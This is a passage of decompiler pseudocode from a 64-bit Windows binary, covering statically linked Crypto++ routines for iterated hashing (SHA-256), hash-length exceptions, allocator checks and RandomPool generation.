      else
        (*(void (__fastcall **)(__int64, __int64, __int64, unsigned __int64, _DWORD, int))(v15 + 280))(
          a2,
          v5,
          v16,
          v14,
          0,
          v19);
      *(_QWORD *)(a1 + 56) += v14;
      *(_QWORD *)(a1 + 64) -= v14;
      v9 -= v14;
    }
    *v6 -= v9;
    return 0i64;
  }
  else
  {
    sub_13F10EE30((__int64)v22, 0);
    v22[0] = (__int64)off_13F181D38;
    v22[3] = a1;
    v22[1] = (__int64)off_13F181EA8;
    memset(&v22[4], 0, 40);
    sub_13F110580((__int64)v22);
    v18 = sub_13F132460(v22, a2, v6, v5, 0);
    (*(void (__fastcall **)(__int64, unsigned __int64))(*(_QWORD *)a1 + 176i64))(a1, *v6);
    return v18;
  }
}
// 13F13231F: variable 'v19' is possibly undefined
// 13F181D38: using guessed type __int64 (__fastcall *off_13F181D38[46])();
// 13F181EA8: using guessed type void *off_13F181EA8[4];

//----- (000000013F132460) ----------------------------------------------------
__int64 __fastcall sub_13F132460(_QWORD *a1, __int64 a2, unsigned __int64 *a3, __int64 a4, char a5)
{
  _QWORD *v5; // r10
  unsigned __int64 v6; // rdi
  __int64 v11; // r11
  __int64 v12; // rdx
  __int64 v13; // rcx
  unsigned __int64 v14; // rsi
  _QWORD *v15; // rcx
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // rsi
  int v20; // [rsp+28h] [rbp-30h]

  v5 = (_QWORD *)a1[4];
  v6 = *a3;
  v11 = 0i64;
  if ( v5 )
  {
    v12 = a1[6];
    while ( 1 )
    {
      v13 = v5[5];
      v14 = v6;
      LOBYTE(v20) = a5;
      if ( v5[6] - v13 - v12 < v6 )
        v14 = v5[6] - v13 - v12;
      v11 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, unsigned __int64, _DWORD, int))(*(_QWORD *)a2 + 280i64))(
              a2,
              a4,
              v5[4] + v13 + v12,
              v14,
              0,
              v20);
      if ( v11 )
        break;
      a1[5] += v14;
      v6 -= v14;
      if ( !v6 )
      {
        a1[6] += v14;
        v16 = 0i64;
        goto LABEL_14;
      }
      v15 = (_QWORD *)a1[4];
      v12 = 0i64;
      v5 = (_QWORD *)*v15;
      a1[4] = *v15;
      a1[6] = 0i64;
      if ( !v5 )
        goto LABEL_8;
    }
    v16 = v6;
  }
  else
  {
LABEL_8:
    v16 = v6;
    if ( v6 )
    {
      v17 = a1[8];
      if ( v17 )
      {
        v18 = v6;
        if ( v17 < v6 )
          v18 = a1[8];
        LOBYTE(v20) = a5;
        v11 = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, unsigned __int64, _DWORD, int))(*(_QWORD *)a2 + 280i64))(
                a2,
                a4,
                a1[7],
                v18,
                0,
                v20);
        v16 = v6;
        if ( !v11 )
        {
          a1[7] += v18;
          a1[8] -= v18;
          v16 = v6 - v18;
        }
      }
    }
  }
LABEL_14:
  *a3 -= v16;
  return v11;
}
// 13F1324E6: variable 'v20' is possibly undefined

//----- (000000013F1325A0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1325A0(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = &CryptoPP::HashInputTooLong::`vftable';
  return a1;
}
// 13F187E98: using guessed type void *CryptoPP::HashInputTooLong::`vftable';

//----- (000000013F1325D0) ----------------------------------------------------
__int64 __fastcall sub_13F1325D0(__int64 a1, const __m128i *a2)
{
  const __m128i *v2; // rsi
  const __m128i *v4; // r14
  __m128i v5; // kr00_16
  __m128i *v6; // rbx
  __m128i *v7; // rbx
  unsigned __int64 v8; // r14
  __m128i v9; // kr10_16
  __m128i *v10; // rbx
  __m128i *v11; // rbx
  __int64 v12; // rdx
  __int64 v13; // rcx
  __m128i v15; // [rsp+48h] [rbp-40h] BYREF
  __m128i si128; // [rsp+58h] [rbp-30h]

  v2 = a2;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v15.m128i_i8[0] = 0;
  v4 = a2 + 1;
  sub_13F106B80(&v15, a2[1].m128i_i64[0] + 70);
  v5 = si128;
  if ( si128.m128i_i64[1] - si128.m128i_i64[0] < 0x46ui64 )
  {
    sub_13F107AD0(
      &v15,
      0x46ui64,
      0i64,
      (const __m128i *)"IteratedHashBase: input data exceeds maximum allowed by hash function ",
      0x46ui64);
  }
  else
  {
    si128.m128i_i64[0] += 70i64;
    v6 = &v15;
    if ( v5.m128i_i64[1] >= 0x10ui64 )
      v6 = (__m128i *)v15.m128i_i64[0];
    v7 = (__m128i *)((char *)v6 + v5.m128i_i64[0]);
    sub_13F15EB00(
      v7,
      (const __m128i *)"IteratedHashBase: input data exceeds maximum allowed by hash function ",
      0x46ui64);
    v7[4].m128i_i8[6] = 0;
  }
  if ( v2[1].m128i_i64[1] >= 0x10ui64 )
    v2 = (const __m128i *)v2->m128i_i64[0];
  v8 = v4->m128i_i64[0];
  v9 = si128;
  if ( v8 > si128.m128i_i64[1] - si128.m128i_i64[0] )
  {
    sub_13F107AD0(&v15, v8, 0i64, v2, v8);
  }
  else
  {
    si128.m128i_i64[0] += v8;
    v10 = &v15;
    if ( v9.m128i_i64[1] >= 0x10ui64 )
      v10 = (__m128i *)v15.m128i_i64[0];
    v11 = (__m128i *)((char *)v10 + v9.m128i_i64[0]);
    sub_13F15EB00(v11, v2, v8);
    v11->m128i_i8[v8] = 0;
  }
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 4;
  sub_13F1053F0((__m128i **)(a1 + 32), &v15);
  *(_QWORD *)a1 = off_13F1833E0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v12 = si128.m128i_i64[1] + 1;
    v13 = v15.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v12 = si128.m128i_i64[1] + 40;
      v13 = *(_QWORD *)(v15.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v15.m128i_i64[0] - v13 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v13, v12);
  }
  *(_QWORD *)a1 = &CryptoPP::HashInputTooLong::`vftable';
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F1833E0: using guessed type __int64 (__fastcall *off_13F1833E0[3])();
// 13F187E98: using guessed type void *CryptoPP::HashInputTooLong::`vftable';
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F1327B0) ----------------------------------------------------
__int64 __fastcall sub_13F1327B0(_DWORD *a1, _QWORD *a2)
{
  unsigned int v4; // eax
  unsigned int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 72i64))(a1);
  if ( v4 <= 1 )
    v5 = 0;
  else
    v5 = v4 - 1;
  v6 = v5 & a1[2];
  *a2 = v4 - v6;
  return v6 + (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 184i64))(a1);
}

//----- (000000013F132810) ----------------------------------------------------
__int64 __fastcall sub_13F132810(__int64 *a1, __int64 a2)
{
  __int64 v2; // rbx
  unsigned int v5; // eax

  v2 = *a1;
  v5 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 72))(a1);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v2 + 176))(a1, a2, v5);
}

//----- (000000013F132850) ----------------------------------------------------
__int64 __fastcall sub_13F132850(_QWORD *a1)
{
  a1[1] = 0i64;
  return (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 152i64))(a1);
}

//----- (000000013F132860) ----------------------------------------------------
__int64 __fastcall sub_13F132860(_DWORD *a1, __int64 a2, unsigned __int64 a3)
{
  const __m128i *v6; // rsi
  unsigned int v7; // er12
  __int64 v8; // r15
  unsigned int v9; // eax
  unsigned int v10; // ecx
  __int64 v11; // rbx
  __int64 v12; // r13
  unsigned int v13; // ebx
  __int64 v14; // rcx
  __int64 v15; // rbx
  unsigned int v16; // eax
  unsigned int v17; // ecx
  unsigned __int64 v18; // r8
  unsigned int v19; // edx
  __int64 v20; // rbx
  unsigned int v21; // eax
  unsigned __int64 v22; // r8
  unsigned int v24; // [rsp+60h] [rbp+8h]
  unsigned int v25; // [rsp+68h] [rbp+10h]
  __int64 v26; // [rsp+78h] [rbp+20h]

  sub_13F111340((__int64)a1, a3);
  v26 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 184i64))(a1);
  v6 = (const __m128i *)(*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 192i64))(a1);
  v25 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 72i64))(a1);
  v7 = v25 - 8;
  v8 = (*(int (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 160i64))(a1);
  v9 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 72i64))(a1);
  v24 = v9;
  if ( v9 <= 1 )
    v10 = 0;
  else
    v10 = v9 - 1;
  v11 = v10 & a1[2];
  v12 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 184i64))(a1);
  *(_BYTE *)(v11 + v12) = 0x80;
  v13 = v11 + 1;
  v14 = v12 + v13;
  if ( v13 > v7 )
  {
    sub_13F15EF70(v14, 0, v24 - v13);
    v15 = *(_QWORD *)a1;
    v16 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 72i64))(a1);
    (*(void (__fastcall **)(_DWORD *, __int64, _QWORD))(v15 + 176))(a1, v12, v16);
    v14 = v12;
  }
  else
  {
    v7 -= v13;
  }
  sub_13F15EF70(v14, 0, v7);
  v17 = 8 * a1[2];
  if ( (_DWORD)v8 )
    v17 = _byteswap_ulong(v17);
  v18 = (unsigned __int64)v25 >> 2;
  *(_DWORD *)(v26 + 4 * (v8 + v18) - 8) = v17;
  v19 = (a1[2] >> 29) + 8 * a1[3];
  if ( (_DWORD)v8 )
    v19 = _byteswap_ulong(v19);
  *(_DWORD *)(v26 + 4 * (v18 - v8) - 4) = v19;
  v20 = *(_QWORD *)a1;
  v21 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 72i64))(a1);
  (*(void (__fastcall **)(_DWORD *, __int64, _QWORD))(v20 + 176))(a1, v26, v21);
  if ( (a2 & 3) != 0 || (a3 & 3) != 0 )
  {
    v22 = (*(unsigned int (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 64i64))(a1);
    if ( (_DWORD)v8 )
      sub_13F12AE84((__int64)v6, (__int64)v6, v22);
    sub_13F15EB00((__m128i *)a2, v6, a3);
  }
  else if ( (_DWORD)v8 )
  {
    sub_13F12AE84(a2, (__int64)v6, a3);
  }
  else if ( v6 != (const __m128i *)a2 )
  {
    sub_13F10D330((__m128i *)a2, a3, v6, a3);
  }
  return (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 56i64))(a1);
}

//----- (000000013F132A20) ----------------------------------------------------
void __fastcall sub_13F132A20(__int64 *a1, const __m128i *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbp
  unsigned int v6; // er14
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // ecx
  __int64 v10; // rax
  unsigned int v11; // eax
  unsigned __int64 v12; // rbx
  unsigned int v13; // er12
  __int64 v14; // rax
  __m128i *v15; // r15
  unsigned int v16; // er12
  unsigned __int64 v17; // r14
  unsigned int v18; // ebx
  __m128i *v19; // rcx
  unsigned __int64 v20; // r8
  const __m128i *v21; // rdx
  __int64 v22; // rax
  __int64 v23; // rbx
  unsigned int v24; // eax
  const __m128i *v25; // rax
  char v26[40]; // [rsp+28h] [rbp-B0h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-88h] BYREF

  if ( a3 )
  {
    v3 = a3;
    v6 = *((_DWORD *)a1 + 2);
    v7 = *((_DWORD *)a1 + 3);
    *((_DWORD *)a1 + 2) = v6 + a3;
    v8 = v7;
    if ( v6 + (unsigned int)a3 < v6 )
      v8 = v7 + 1;
    v9 = HIDWORD(a3) + v8;
    *((_DWORD *)a1 + 3) = v9;
    v10 = *a1;
    if ( v9 < v7 )
    {
      v25 = (const __m128i *)(*(__int64 (__fastcall **)(__int64 *, char *))(v10 + 16))(a1, v26);
      sub_13F1325D0((__int64)pExceptionObject, v25);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVHashInputTooLong_CryptoPP__);
    }
    v11 = (*(__int64 (__fastcall **)(__int64 *))(v10 + 72))(a1);
    v12 = v11;
    if ( v11 <= 1 )
      v13 = 0;
    else
      v13 = v11 - 1;
    v14 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 184))(a1);
    v15 = (__m128i *)v14;
    v16 = v6 & v13;
    v17 = v12;
    if ( v16 )
    {
      if ( v16 + v3 < v12 )
      {
        if ( !a2 )
          return;
        v19 = (__m128i *)(v16 + v14);
        v20 = v3;
        v21 = a2;
        goto LABEL_18;
      }
      v18 = v12 - v16;
      if ( a2 )
        sub_13F15EB00((__m128i *)(v16 + v14), a2, v18);
      sub_13F132810(a1, (__int64)v15);
      a2 = (const __m128i *)((char *)a2 + v18);
      v3 -= v18;
    }
    if ( v3 >= v17 )
    {
      if ( a2 == v15 )
      {
        sub_13F132810(a1, (__int64)v15);
        return;
      }
      if ( ((unsigned __int8)a2 & 3) != 0 )
      {
        do
        {
          if ( a2 )
            sub_13F15EB00(v15, a2, v17);
          v23 = *a1;
          v24 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 72))(a1);
          (*(void (__fastcall **)(__int64 *, __m128i *, _QWORD))(v23 + 176))(a1, v15, v24);
          a2 = (const __m128i *)((char *)a2 + v17);
          v3 -= v17;
        }
        while ( v3 >= v17 );
      }
      else
      {
        v22 = (*(__int64 (__fastcall **)(__int64 *, const __m128i *, unsigned __int64))(*a1 + 176))(a1, a2, v3);
        a2 = (const __m128i *)((char *)a2 + v3 - v22);
        v3 = v22;
      }
    }
    if ( a2 && v15 != a2 )
    {
      v20 = v3;
      v21 = a2;
      v19 = v15;
LABEL_18:
      sub_13F15EB00(v19, v21, v20);
    }
  }
}
// 13F132A20: using guessed type char var_B0[40];

//----- (000000013F132BE0) ----------------------------------------------------
__int64 __fastcall sub_13F132BE0(__int64 a1, unsigned __int64 a2)
{
  __m128i v3[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  if ( a2 > 0x1FFFFFFFFFFFFFFFi64 )
  {
    sub_13F1053B0(v3, (const __m128i *)"AllocatorBase: requested size would cause integer overflow");
    sub_13F101600((__int64)pExceptionObject, v3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( a2 )
    return sub_13F12E4E0(8 * a2);
  else
    return 0i64;
}
// 13F132BE0: using guessed type __m128i var_80[2];

//----- (000000013F132C90) ----------------------------------------------------
__int64 __fastcall sub_13F132C90(__int64 a1)
{
  __int64 v2; // rcx
  __int64 v3; // rcx
  __int64 v4; // rax
  _QWORD *v5; // r14

  sub_13F10EE30(a1, 1);
  *(_QWORD *)a1 = &CryptoPP::RandomPool::`vftable';
  *(_BYTE *)(a1 + 33) = 0;
  *(_QWORD *)(a1 + 40) = -1i64;
  *(_QWORD *)(a1 + 48) = 16i64;
  if ( *(_BYTE *)(a1 + 33) )
  {
    v2 = 0i64;
  }
  else
  {
    *(_BYTE *)(a1 + 33) = 1;
    v2 = a1 + 8 + (((_BYTE)a1 + 8) & 0xF);
  }
  *(_QWORD *)(a1 + 56) = v2;
  *(_BYTE *)(a1 + 105) = 0;
  *(_QWORD *)(a1 + 112) = -1i64;
  *(_QWORD *)(a1 + 120) = 32i64;
  if ( *(_BYTE *)(a1 + 105) )
  {
    v3 = 0i64;
  }
  else
  {
    *(_BYTE *)(a1 + 105) = 1;
    v3 = a1 + 64 + (((_BYTE)a1 + 64) & 0xF);
  }
  *(_QWORD *)(a1 + 128) = v3;
  v4 = sub_13F14059C(96i64);
  v5 = (_QWORD *)v4;
  if ( v4 )
  {
    sub_13F10EE30(v4 + 8, 1);
    v5[5] = 0x3FFFFFFFFFFFFFFFi64;
    v5[6] = 0i64;
    v5[7] = sub_13F106F10((__int64)(v5 + 4), 0i64);
    v5[9] = -1i64;
    v5[10] = 0i64;
    v5[11] = 0i64;
    *v5 = off_13F1880A8;
    v5[1] = off_13F188128;
  }
  else
  {
    v5 = 0i64;
  }
  *(_QWORD *)(a1 + 136) = v5;
  *(_BYTE *)(a1 + 144) = 0;
  sub_13F15EF70(*(_QWORD *)(a1 + 128), 0, *(_QWORD *)(a1 + 120));
  sub_13F15EF70(*(_QWORD *)(a1 + 56), 0, *(_QWORD *)(a1 + 48));
  return a1;
}
// 13F187F50: using guessed type void *CryptoPP::RandomPool::`vftable';
// 13F1880A8: using guessed type __int64 (__fastcall *off_13F1880A8[16])();
// 13F188128: using guessed type void *off_13F188128[11];

//----- (000000013F132E00) ----------------------------------------------------
_DWORD *__fastcall sub_13F132E00(__int64 a1)
{
  unsigned __int64 v1; // rdx
  _DWORD *v2; // rdi
  _DWORD *result; // rax
  unsigned __int64 i; // rcx

  v1 = *(_QWORD *)(a1 + 88);
  v2 = *(_DWORD **)(a1 + 96);
  if ( *(_QWORD *)(a1 + 80) < v1 )
    v1 = *(_QWORD *)(a1 + 80);
  result = (_DWORD *)(a1 + (a1 & 0xF));
  if ( v2 == result )
  {
    *(_BYTE *)(a1 + 73) = 0;
    result = 0i64;
    for ( i = v1; i; --i )
      *v2++ = 0;
  }
  return result;
}

//----- (000000013F132E40) ----------------------------------------------------
_DWORD *__fastcall sub_13F132E40(__int64 a1)
{
  __int64 v1; // rdx
  unsigned __int64 v3; // rcx
  _DWORD *v4; // rdi
  _DWORD *result; // rax
  unsigned __int64 v6; // rcx
  _DWORD *v7; // rdi

  v1 = a1 + 112;
  v3 = *(_QWORD *)(a1 + 200);
  v4 = *(_DWORD **)(v1 + 96);
  if ( *(_QWORD *)(v1 + 80) < v3 )
    v3 = *(_QWORD *)(v1 + 80);
  result = (_DWORD *)(v1 + (v1 & 0xF));
  if ( v4 == result )
  {
    result = 0i64;
    *(_BYTE *)(v1 + 73) = 0;
    while ( v3 )
    {
      *v4++ = 0;
      --v3;
    }
  }
  v6 = *(_QWORD *)(a1 + 96);
  v7 = *(_DWORD **)(a1 + 104);
  if ( *(_QWORD *)(a1 + 88) < v6 )
    v6 = *(_QWORD *)(a1 + 88);
  *(_BYTE *)(a1 + 81) = 0;
  if ( v7 == (_DWORD *)(a1 + 16) )
  {
    result = 0i64;
    while ( v6 )
    {
      *v7++ = 0;
      --v6;
    }
  }
  return result;
}

//----- (000000013F132EA0) ----------------------------------------------------
__int64 __fastcall sub_13F132EA0(__int64 a1, char a2)
{
  void (__fastcall ***v4)(_QWORD, __int64); // rcx
  unsigned __int64 v5; // rdx
  void *v6; // rdi
  unsigned __int64 v7; // rcx
  void *v8; // rdi
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rcx

  v4 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 136);
  if ( v4 )
    (**v4)(v4, 1i64);
  v5 = *(_QWORD *)(a1 + 112);
  v6 = *(void **)(a1 + 128);
  v7 = *(_QWORD *)(a1 + 120);
  if ( v6 == (void *)(a1 + 64 + (((_BYTE)a1 + 64) & 0xF)) )
  {
    *(_BYTE *)(a1 + 105) = 0;
    if ( v5 < v7 )
      v7 = v5;
    memset(v6, 0, v7);
  }
  v8 = *(void **)(a1 + 56);
  v9 = *(_QWORD *)(a1 + 40);
  v10 = *(_QWORD *)(a1 + 48);
  if ( v8 == (void *)(a1 + 8 + (((_BYTE)a1 + 8) & 0xF)) )
  {
    *(_BYTE *)(a1 + 33) = 0;
    if ( v9 < v10 )
      v10 = v9;
    memset(v8, 0, v10);
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 152i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F132F50) ----------------------------------------------------
__int64 __fastcall sub_13F132F50(__int64 a1, char a2)
{
  __int64 v2; // r8
  unsigned __int64 v4; // rcx
  _DWORD *v5; // rdi
  unsigned __int64 v6; // rcx
  _DWORD *v7; // rdi

  v2 = a1 + 112;
  v4 = *(_QWORD *)(a1 + 200);
  v5 = *(_DWORD **)(v2 + 96);
  if ( *(_QWORD *)(v2 + 80) < v4 )
    v4 = *(_QWORD *)(v2 + 80);
  if ( v5 == (_DWORD *)(v2 + (v2 & 0xF)) )
  {
    *(_BYTE *)(v2 + 73) = 0;
    while ( v4 )
    {
      *v5++ = 0;
      --v4;
    }
  }
  v6 = *(_QWORD *)(a1 + 96);
  v7 = *(_DWORD **)(a1 + 104);
  if ( *(_QWORD *)(a1 + 88) < v6 )
    v6 = *(_QWORD *)(a1 + 88);
  *(_BYTE *)(a1 + 81) = 0;
  if ( v7 == (_DWORD *)(a1 + 16) )
  {
    while ( v6 )
    {
      *v7++ = 0;
      --v6;
    }
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 216i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F132FD0) ----------------------------------------------------
__m128i *__fastcall sub_13F132FD0(__int64 a1, __m128i *a2)
{
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C30(a2, (const __m128i *)"SHA-256");
  return a2;
}

//----- (000000013F133010) ----------------------------------------------------
__m128i *__fastcall sub_13F133010(_QWORD *a1)
{
  __m128i *result; // rax
  __m128i *v3; // rbx
  __m128i *v4; // rax
  const __m128i *v5; // r8

  result = (__m128i *)sub_13F14059C(216i64);
  v3 = result;
  if ( result )
  {
    sub_13F106500(result, a1);
    v3[11].m128i_i8[9] = 0;
    v3[12].m128i_i64[0] = a1[24];
    v3[12].m128i_i64[1] = a1[25];
    if ( a1[25] > 0x10ui64 || v3[11].m128i_i8[9] )
    {
      v4 = 0i64;
    }
    else
    {
      v3[11].m128i_i8[9] = 1;
      v4 = (__m128i *)((char *)v3 + (((unsigned __int8)v3 + 112) & 0xF) + 112);
    }
    v3[13].m128i_i64[0] = (__int64)v4;
    if ( v4 )
    {
      v5 = (const __m128i *)a1[26];
      if ( v5 )
        sub_13F10D330(v4, 4 * v3[12].m128i_i64[1], v5, 4i64 * a1[25]);
    }
    v3->m128i_i64[0] = (__int64)off_13F187FB8;
    return v3;
  }
  return result;
}
// 13F187FB8: using guessed type __int64 (__fastcall *off_13F187FB8[25])();

//----- (000000013F1330E0) ----------------------------------------------------
void __fastcall sub_13F1330E0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rsi
  int v8; // eax
  __int64 v9; // rbx
  int v10; // [rsp+28h] [rbp-40h]
  void **v11; // [rsp+30h] [rbp-38h]
  __int64 v12; // [rsp+38h] [rbp-30h]
  __int64 v13; // [rsp+40h] [rbp-28h]
  __int64 v14; // [rsp+48h] [rbp-20h]

  if ( a4 )
  {
    v4 = a4;
    if ( !*(_BYTE *)(a1 + 144) )
      (*(void (__fastcall **)(_QWORD, _QWORD, __int64, __int64 (__fastcall *(**)[2])()))(**(_QWORD **)(a1 + 136) + 48i64))(
        *(_QWORD *)(a1 + 136),
        *(_QWORD *)(a1 + 128),
        32i64,
        &off_13F1B7048);
    LODWORD(v12) = 0;
    WORD2(v12) = 0;
    v13 = 0i64;
    v14 = 0i64;
    v11 = &CryptoPP::Timer::`vftable';
    **(_QWORD **)(a1 + 56) += sub_13F140020();
    *(_QWORD *)(*(_QWORD *)(a1 + 56) + 8i64) += sub_13F169E64(0i64);
    do
    {
      (*(void (__fastcall **)(__int64, _QWORD, _QWORD, _QWORD))(*(_QWORD *)(*(_QWORD *)(a1 + 136) + 8i64) + 32i64))(
        *(_QWORD *)(a1 + 136) + 8i64,
        *(_QWORD *)(a1 + 56),
        0i64,
        *(_QWORD *)(a1 + 56));
      v8 = 16;
      LOBYTE(v10) = 1;
      if ( v4 < 0x10 )
        v8 = v4;
      v9 = v8;
      (*(void (__fastcall **)(__int64, __int64, _QWORD, _QWORD, _DWORD, int, void **, __int64, __int64, __int64))(*(_QWORD *)a2 + 280i64))(
        a2,
        a3,
        *(_QWORD *)(a1 + 56),
        v8,
        0,
        v10,
        v11,
        v12,
        v13,
        v14);
      v4 -= v9;
    }
    while ( v4 );
  }
}
// 8: found interdependent unknown calls
// 13F1331D5: variable 'v10' is possibly undefined
// 13F1331D5: variable 'v11' is possibly undefined
// 13F1331D5: variable 'v12' is possibly undefined
// 13F1331D5: variable 'v13' is possibly undefined
// 13F1331D5: variable 'v14' is possibly undefined
// 13F188090: using guessed type void *CryptoPP::Timer::`vftable';
// 13F1B7048: using guessed type __int64 (__fastcall *(*off_13F1B7048)[2])();

//----- (000000013F133200) ----------------------------------------------------
__int64 __fastcall sub_13F133200(__int64 a1, unsigned int *a2)
{
  return sub_13F1313F0(*(__int128 **)(a1 + 208), a2);
}

//----- (000000013F133210) ----------------------------------------------------
char *__fastcall sub_13F133210(__int64 a1, const __m128i *a2, unsigned __int64 a3)
{
  __int64 v6; // rdi
  __int64 v7; // rbx
  unsigned int v8; // eax
  __int64 v9; // rcx
  char *v10; // rdi
  __int64 v11; // rcx
  char *result; // rax
  char *v13; // rdi
  __int64 v14[2]; // [rsp+28h] [rbp-D8h] BYREF
  char v15[72]; // [rsp+38h] [rbp-C8h] BYREF
  __m128i si128; // [rsp+80h] [rbp-80h]
  char *v17; // [rsp+90h] [rbp-70h]
  char v18[80]; // [rsp+98h] [rbp-68h] BYREF
  __m128i v19; // [rsp+E8h] [rbp-18h]
  char *v20; // [rsp+F8h] [rbp-8h]

  sub_13F10EE30((__int64)v14, 1);
  v14[1] = 0i64;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AE0);
  v15[65] = 1;
  v17 = v15;
  v19 = si128;
  v18[73] = 1;
  v20 = &v18[(unsigned __int64)v18 & 0xF];
  sub_13F12F4E0(v20);
  v14[0] = (__int64)off_13F187FB8;
  sub_13F132A20(v14, *(const __m128i **)(a1 + 128), 0x20ui64);
  sub_13F132A20(v14, a2, a3);
  v6 = *(_QWORD *)(a1 + 128);
  v7 = v14[0];
  v8 = (*(__int64 (__fastcall **)(__int64 *))(v14[0] + 64))(v14);
  (*(void (__fastcall **)(__int64 *, __int64, _QWORD))(v7 + 120))(v14, v6, v8);
  *(_BYTE *)(a1 + 144) = 0;
  v9 = v19.m128i_i64[1];
  if ( v19.m128i_i64[0] < (unsigned __int64)v19.m128i_i64[1] )
    v9 = v19.m128i_i64[0];
  v10 = v20;
  if ( v20 == &v18[(unsigned __int64)v18 & 0xF] )
  {
    while ( v9 )
    {
      *(_DWORD *)v10 = 0;
      v10 += 4;
      --v9;
    }
  }
  v11 = si128.m128i_i64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v11 = si128.m128i_i64[0];
  result = v15;
  v13 = v17;
  if ( v17 == v15 )
  {
    result = 0i64;
    while ( v11 )
    {
      *(_DWORD *)v13 = 0;
      v13 += 4;
      --v11;
    }
  }
  return result;
}
// 13F185AE0: using guessed type __int128 xmmword_13F185AE0;
// 13F187FB8: using guessed type __int64 (__fastcall *off_13F187FB8[25])();

//----- (000000013F133350) ----------------------------------------------------
void __fastcall sub_13F133350(__int64 a1)
{
  sub_13F12F4E0(*(_OWORD **)(a1 + 208));
}

//----- (000000013F133370) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F133370(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  unsigned __int64 v3; // rcx
  unsigned __int64 result; // rax

  v2 = a2 >> 3;
  v3 = 2 * (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)a1 + 40i64))(a1) + 1;
  result = v2 - v3;
  if ( v2 <= v3 )
    return 0i64;
  return result;
}

//----- (000000013F1333A0) ----------------------------------------------------
__int64 __fastcall sub_13F1333A0(
        __int64 a1,
        __int64 a2,
        const __m128i *a3,
        unsigned __int64 a4,
        _BYTE *a5,
        unsigned __int64 a6,
        __int64 a7)
{
  _BYTE *v9; // rsi
  __int64 v10; // rbx
  __int64 v11; // r14
  __int64 v12; // rbp
  _BYTE *v13; // r12
  unsigned __int64 v14; // r9
  void *v15; // r8
  __m128i *v16; // rcx
  unsigned __int64 *v17; // rcx
  void *v18; // r8
  int v20; // [rsp+30h] [rbp-B8h]
  __int64 v22; // [rsp+40h] [rbp-A8h]
  char v23[8]; // [rsp+48h] [rbp-A0h] BYREF
  void *v24; // [rsp+50h] [rbp-98h]
  unsigned __int64 v25; // [rsp+58h] [rbp-90h]
  unsigned __int64 v26; // [rsp+68h] [rbp-80h] BYREF
  unsigned __int64 v27; // [rsp+70h] [rbp-78h] BYREF
  void *v28; // [rsp+78h] [rbp-70h]
  const __m128i *v29; // [rsp+80h] [rbp-68h]
  __int64 v30; // [rsp+88h] [rbp-60h]
  __int64 v31; // [rsp+90h] [rbp-58h]

  v30 = -2i64;
  v29 = a3;
  v9 = a5;
  if ( (a6 & 7) != 0 )
  {
    *a5 = 0;
    v9 = a5 + 1;
  }
  v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 48i64))(a1);
  v31 = v10;
